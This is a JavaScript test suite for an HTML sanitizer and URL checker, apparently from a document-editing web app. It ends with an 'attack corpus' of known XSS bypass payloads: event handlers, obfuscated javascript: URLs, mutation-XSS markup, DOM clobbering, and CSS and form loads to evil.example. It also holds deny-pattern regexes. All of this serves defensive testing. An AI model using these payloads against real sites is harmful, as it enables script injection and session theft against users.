import test from 'node:test';
import assert from 'node:assert/strict';
import { parseHTML } from 'linkedom';
import { sanitizeHTML, cleanStyle } from '../src/js/content/sanitize.js';
import { safeURL, isHttps } from '../src/js/content/url.js';

const { document } = parseHTML('<!doctype html><html><body></body></html>');
// linkedom's DOMParser does not wrap fragments in <body>; inject a thin adapter (this is what env injection is for).
class DOMParser {
  parseFromString(html) {
    return parseHTML(/<html|<!doctype/i.test(html) ? html : `<!doctype html><html><head></head><body>${html}</body></html>`).document;
  }
}
const env = { DOMParser, document };
const clean = (h) => sanitizeHTML(h, env);

test('script, style, iframe and friends are removed with content', () => {
  assert.equal(clean('<p>a</p><script>alert(1)</script>'), '<p>a</p>');
  assert.equal(clean('<style>p{}</style><p>b</p>'), '<p>b</p>');
  assert.equal(clean('<iframe src="https://x.com"></iframe>ok'), 'ok');
  assert.equal(clean('<form><input name=a><button>x</button></form>t'), 't');
  assert.equal(clean('<svg onload="x()"><circle/></svg>t'), 't');
  assert.equal(clean('<object data="x"></object><embed src="x">t'), 't');
});

test('event handler and unknown attributes are dropped', () => {
  assert.equal(clean('<p onclick="x()" id="a" data-x="1">t</p>'), '<p>t</p>');
  assert.ok(!clean('<img src="https://a.com/i.png" onerror="alert(1)">').includes('onerror'));
  assert.ok(!clean('<a href="https://a.com" onmouseover="x()">t</a>').includes('onmouseover'));
});

test('javascript:, vbscript: and data:text hrefs are stripped', () => {
  assert.ok(!clean('<a href="javascript:alert(1)">t</a>').includes('href'));
  assert.ok(!clean('<a href=" JaVaScRiPt:alert(1)">t</a>').includes('href'));
  assert.ok(!clean('<a href="vbscript:x">t</a>').includes('href'));
  assert.ok(!clean('<a href="data:text/html,<script>1</script>">t</a>').includes('href'));
  assert.ok(!clean('<a href="/relative">t</a>').includes('href'));
  assert.equal(clean('<a href="javascript:alert(1)">t</a>'), '<a>t</a>');
});

test('allowed URL schemes survive on links', () => {
  assert.match(clean('<a href="https://a.com/x">t</a>'), /href="https:\/\/a\.com\/x"/);
  assert.match(clean('<a href="http://a.com/x">t</a>'), /href="http:\/\/a\.com\/x"/);
  assert.match(clean('<a href="mailto:a@b.co">t</a>'), /href="mailto:a@b\.co"/);
  assert.match(clean('<a href="tel:+98911">t</a>'), /href="tel:\+98911"/);
  assert.match(clean('<a href="https://a.com" target="_blank">t</a>'), /rel="noopener noreferrer"/);
  assert.match(clean('<a href="https://a.com" target="_blank">t</a>'), /target="_blank"/);
});

test('images: data:image and https allowed, others dropped', () => {
  assert.match(clean('<img src="data:image/png;base64,iVBORw0KGgo=">'), /src="data:image\/png;base64,iVBORw0KGgo="/);
  assert.match(clean('<img src="https://a.com/i.jpg" alt="x">'), /src="https:\/\/a\.com\/i\.jpg"/);
  assert.equal(clean('<img src="javascript:alert(1)">'), '');
  assert.equal(clean('<img src="data:image/svg+xml;base64,PHN2Zy8+">'), '');
  assert.equal(clean('<img src="data:text/html;base64,AAAA">'), '');
  assert.equal(clean('<img src="file:///etc/passwd">'), '');
  assert.equal(clean('<img src="ftp://a.com/i.png">'), '');
});

test('data:image is not allowed for links', () => {
  assert.ok(!clean('<a href="data:image/png;base64,AAAA">t</a>').includes('href'));
});

test('styles: allow-list, no url() / expression', () => {
  assert.equal(cleanStyle('color:red;background-image:url(x);position:fixed'), 'color:red');
  assert.equal(cleanStyle('color:expression(alert(1))'), '');
  assert.equal(cleanStyle('text-align:justify;font-size:14px'), 'text-align:justify;font-size:14px');
  assert.equal(cleanStyle('font-size:calc(1px)'), '');
  assert.match(clean('<p style="color:#123;behavior:url(x)">t</p>'), /style="color:#123"/);
});

test('font tag becomes span with color/size', () => {
  assert.equal(clean('<font color="#ff0000" size="5">t</font>'), '<span style="color:#ff0000;font-size:24px">t</span>');
  assert.equal(clean('<font color="red;x:url(1)">t</font>'), '<span>t</span>');
});

test('unknown tags unwrap, classes are filtered', () => {
  assert.equal(clean('<custom-el><b>x</b></custom-el>'), '<b>x</b>');
  assert.equal(clean('<div class="card evil"><p>t</p></div>'), '<div class="card"><p>t</p></div>');
});

test('furniture marker kept only for known values', () => {
  assert.match(clean('<div data-md2-furniture="header">t</div>'), /data-md2-furniture="header"/);
  assert.ok(!clean('<div data-md2-furniture="x">t</div>').includes('data-md2'));
});

test('table cell spans are numeric only', () => {
  assert.match(clean('<table><tr><td colspan="2">a</td></tr></table>'), /colspan="2"/);
  assert.ok(!clean('<table><tr><td colspan="x">a</td></tr></table>').includes('colspan'));
});

test('safeURL / isHttps', () => {
  assert.equal(safeURL('https://a.com'), 'https://a.com/');
  assert.equal(safeURL('javascript:1'), null);
  assert.equal(safeURL('//a.com'), null);
  assert.equal(safeURL('https://'), null);
  assert.equal(safeURL('data:image/gif;base64,R0lG', { image: true }), 'data:image/gif;base64,R0lG');
  assert.equal(safeURL('data:image/gif;base64,R0lG'), null);
  assert.equal(safeURL('data:image/png;base64,AA"onerror=x', { image: true }), null);
  assert.equal(safeURL('https://a.com/\u0000x'), null);
  assert.equal(isHttps('https://a.com'), true);
  assert.equal(isHttps('http://a.com'), false);
});

import { renderChart, extractChartData } from '../src/js/content/chart.js';

test('chart SVG survives intact; foreign SVG is still dropped', () => {
  const d = extractChartData([['a', 'b'], ['x', '1'], ['y', '2']]);
  for (const type of ['bar', 'line', 'pie']) {
    const svg = renderChart({ type, data: d, series: [0] });
    const out = clean(`<figure class="chart">${svg}</figure>`);
    assert.ok(out.includes('<svg') && out.includes('chart-svg') && out.includes('viewBox="0 0 640 340"'), type);
    assert.equal((out.match(/<(rect|path|line|polyline|circle|text)\b/g) || []).length, (svg.match(/<(rect|path|line|polyline|circle|text)\b/g) || []).length, type);
  }
  assert.equal(clean('<svg><circle r="1"/></svg>t'), 't');
});
test('chart SVG: scripts, handlers, links, foreign elements and bad values are stripped', () => {
  const evil = '<svg class="chart-svg" viewBox="0 0 10 10" onload="x()" style="direction:ltr;background:url(x)"><script>alert(1)</script>' +
    '<a href="https://evil.example"><text x="1" y="1" onclick="x()" fill="javascript:1">hi</text></a>' +
    '<foreignObject><div>x</div></foreignObject><use href="#a"/><image href="https://evil.example/i.png"/><style>*{}</style>' +
    '<rect x="1" y="1" width="expression(1)" height="3" fill="#fff" stroke="url(#x)" onmouseover="x()"/><animate attributeName="x"/></svg>';
  const out = clean(evil);
  assert.ok(out.includes('<svg') && out.includes('<rect'));
  assert.ok(!/script|onload|onclick|onmouse|href|foreignObject|<use|<image|<style|<animate|evil|javascript|expression|url\(|alert/i.test(out), out);
});
test('heading ids, #-links and code language label are kept only in safe form', () => {
  assert.equal(clean('<h2 id="s-مقدمه">x</h2>'), '<h2 id="s-مقدمه">x</h2>');
  assert.equal(clean('<h2 id="title">x</h2>'), '<h2>x</h2>');
  assert.equal(clean('<a href="#s-مقدمه">t</a>'), '<a href="#s-مقدمه">t</a>');
  assert.equal(clean('<a href="#evil">t</a>'), '<a>t</a>');
  assert.equal(clean('<pre data-lang="js"><code>x</code></pre>'), '<pre data-lang="js"><code>x</code></pre>');
  assert.equal(clean('<pre data-lang="x&quot;y"><code>x</code></pre>'), '<pre><code>x</code></pre>');
  assert.equal(clean('<li class="task task-done evil">x</li>'), '<li class="task task-done">x</li>');
});

// ---- attack corpus ----
// The app runs with 'unsafe-inline' (it is one inline script), so this sanitizer is the only wall
// between pasted HTML and the signed-in session. Each payload below is a known way through a weaker
// filter. The assertion is about what is LEFT: no element or attribute that can run or load anything.
const ATTACKS = [
  '<img src=x onerror=alert(1)>',
  '<img src="https://a.com/x.png" onerror="alert(1)" onload="alert(2)">',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<img src="jav&#x09;ascript:alert(1)">',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg class="chart-svg"><script>alert(1)</script><a href="javascript:alert(1)"><text>x</text></a><use href="#x"/><image href="https://a.com/x"/><foreignObject><p onclick="x()">t</p></foreignObject><animate attributeName="href" values="javascript:alert(1)"/><rect onclick="alert(1)" style="background:url(x)"/></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="  javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<a href="https://a.com" target="_blank" onclick="alert(1)" ping="https://evil.example/p">x</a>',
  '<a href="blob:https://a.com/1">x</a>',
  '<a href="file:///etc/passwd">x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">',
  '<form action="https://evil.example"><input name=pin><button formaction="javascript:alert(1)">go</button></form>',
  '<details open ontoggle=alert(1)><summary>x</summary></details>',
  '<body onload=alert(1)><p onfocus=alert(1) autofocus tabindex=1>x</p>',
  '<video><source onerror=alert(1)></video><audio src=x onerror=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<style>@import "https://evil.example/x.css"; p{background:url(https://evil.example/t)}</style>',
  '<p style="background-image:url(https://evil.example/t)">x</p>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<p style="width:expression(alert(1))">x</p>',
  '<p style="color:red;behavior:url(x.htc);-moz-binding:url(x)">x</p>',
  '<p style="color:re\\64;background:\\75rl(x)">x</p>',
  '<p style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</p>',
  '<div id="preview" name="body" class="palette modal-backdrop">clobber</div>',
  '<a id="location" href="https://evil.example">x</a><form id="document"></form><img name="cookie" src="https://a.com/x.png">',
  '<template><script>alert(1)</script></template><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<span data-md2-furniture="header" onmouseover="alert(1)" contenteditable="true" draggable="true">x</span>',
  '<table background="javascript:alert(1)"><td background="javascript:alert(1)" colspan="1 onclick=alert(1)">x</td></table>',
  '<font color="red;background:url(x)" size="7" face="x" onclick="alert(1)">x</font>',
  '<h1 id="s-ok" onclick="x()">t</h1><h1 id="x onclick=alert(1)">t</h1>',
  '<pre data-lang="js onclick=alert(1)">x</pre>',
  '<!--<img src="--><img src=x onerror=alert(1)//">',
  '<img src="https://a.com/x.png" srcset="https://evil.example/t 1x" usemap="#m" longdesc="javascript:alert(1)">',
  '<a href="https://a.com" style="position:absolute;inset:0">x</a>',
  '<p title="x" lang="fa" dir="rtl" formaction="javascript:alert(1)" xlink:href="javascript:alert(1)" xmlns:xlink="http://www.w3.org/1999/xlink">x</p>',
];
const SAFE_TAGS = new Set(('article header footer section main div p br h1 h2 h3 h4 h5 h6 strong b em i u s del mark sup sub small a code pre ' +
  'ul ol li blockquote hr table caption thead tbody tfoot tr th td img aside span figure figcaption nav svg g rect path line polyline circle text tspan title').split(' '));
const SAFE_ATTRS = new Set(('alt title dir lang colspan rowspan id data-lang data-md2-furniture class style href rel target src loading ' +
  'viewBox x y x1 y1 x2 y2 cx cy r rx ry dy width height d points fill stroke stroke-width font-size opacity fill-opacity stroke-opacity ' +
  'stroke-linecap stroke-linejoin font-weight text-anchor transform shape-rendering role aria-label').split(' '));

test('attack corpus: nothing that can run, load or overlay survives', () => {
  for (const payload of ATTACKS) {
    const out = clean(payload);
    const box = parseHTML(`<!doctype html><html><body>${out}</body></html>`).document.body;
    for (const n of box.querySelectorAll('*')) {
      const tag = n.localName.toLowerCase();
      assert.ok(SAFE_TAGS.has(tag), `<${tag}> survived: ${payload}`);
      const inSvg = !!n.closest('svg');
      for (const a of n.attributes) {
        assert.ok(SAFE_ATTRS.has(a.name), `${a.name} survived on <${tag}>: ${payload}`);
        assert.ok(!/^on/i.test(a.name), payload);
        if (a.name === 'href' && !inSvg) assert.match(a.value, /^(https?:\/\/|mailto:|tel:|#s-)/, payload);
        if (a.name === 'src') assert.match(a.value, /^(https?:\/\/|data:image\/(png|jpe?g|webp|gif);base64,)/, payload);
        if (a.name === 'style') assert.ok(!/url\s*\(|expression|javascript|position|z-index|binding|behavior|\\/i.test(a.value), `style "${a.value}": ${payload}`);
        if (a.name === 'id') assert.match(a.value, /^s-/, payload);
      }
      if (inSvg) assert.ok(!n.hasAttribute('href'), payload);
    }
    assert.ok(!/javascript:|vbscript:|<script|onerror|onload|evil\.example\/(t|p|x\.css)/i.test(out), `left in output: ${out}  ←  ${payload}`);
  }
});
